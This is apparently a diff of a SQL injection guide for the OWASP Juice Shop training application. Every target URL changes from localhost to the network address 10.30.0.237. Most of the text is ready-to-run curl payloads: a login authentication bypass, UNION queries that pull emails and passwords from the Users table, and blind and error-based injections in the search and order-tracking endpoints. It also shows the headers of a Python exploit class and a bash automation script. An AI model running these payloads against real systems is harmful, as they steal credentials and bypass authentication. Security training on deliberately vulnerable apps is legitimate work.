@@ -47,17 +47,17 @@ npm install -g juice-shop-cli
 
 ```bash
 # Basic authentication bypass
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
 
 # Union-based injection to extract admin credentials
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\'' UNION SELECT id,email,password FROM Users WHERE email='\''admin@juice-sh.op'\''--","password":"test"}'
 
 # Boolean-based blind injection to confirm admin exists
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\'' AND (SELECT COUNT(*) FROM Users WHERE email='\''admin@juice-sh.op'\'')>0--","password":"test"}'
 ```
@@ -80,7 +80,7 @@ import re
 from urllib.parse import quote, unquote
 
 class JuiceShopSQLInjection:
-    def __init__(self, base_url="http://localhost:3000"):
+    def __init__(self, base_url="http://10.30.0.237:3000"):
         self.base_url = base_url
         self.session = requests.Session()
         self.session.headers.update({
@@ -688,12 +688,12 @@ if __name__ == "__main__":
 
 ```bash
 # Simple admin bypass
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
 
 # Union-based credential extraction
-curl -X POST "http://localhost:3000/rest/user/login" \
+curl -X POST "http://10.30.0.237:3000/rest/user/login" \
   -H "Content-Type: application/json" \
   -d '{"email":"'\'' UNION SELECT id,email,password FROM Users--","password":"test"}'
 ```
@@ -702,23 +702,23 @@ curl -X POST "http://localhost:3000/rest/user/login" \
 
 ```bash
 # Boolean blind injection test
-curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='1"
-curl "http://localhost:3000/rest/products/search?q=apple' AND '1'='2"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='1"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='2"
 
 # Union injection to extract users
-curl "http://localhost:3000/rest/products/search?q=apple' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--"
+curl "http://10.30.0.237:3000/rest/products/search?q=apple' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--"
 ```
 
 ### 3. Order Tracking Injection
 
 ```bash
 # Error-based injection
-curl -X POST "http://localhost:3000/rest/track-order" \
+curl -X POST "http://10.30.0.237:3000/rest/track-order" \
   -H "Content-Type: application/json" \
   -d '{"orderId":"1'\'';"}'
 
 # Union injection in order tracking
-curl -X POST "http://localhost:3000/rest/track-order" \
+curl -X POST "http://10.30.0.237:3000/rest/track-order" \
   -H "Content-Type: application/json" \
   -d '{"orderId":"1 UNION SELECT id,email,password FROM Users--"}'
 ```
@@ -732,7 +732,7 @@ curl -X POST "http://localhost:3000/rest/track-order" \
 set -e
 
 # Configuration
-JUICE_SHOP_URL="http://localhost:3000"
+JUICE_SHOP_URL="http://10.30.0.237:3000"
 RESULTS_DIR="juice_shop_sqli_$(date +%Y%m%d_%H%M%S)"
 
 # Colors
